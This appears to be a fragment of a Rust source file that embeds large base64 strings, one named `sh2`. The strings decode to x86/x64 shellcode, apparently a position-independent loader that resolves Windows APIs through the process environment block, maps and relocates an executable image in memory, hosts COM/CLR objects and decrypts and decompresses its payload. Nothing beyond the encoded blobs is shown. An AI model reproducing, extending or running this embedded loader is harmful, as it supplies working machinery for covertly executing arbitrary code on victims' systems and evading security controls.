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";

const sh2: &str = "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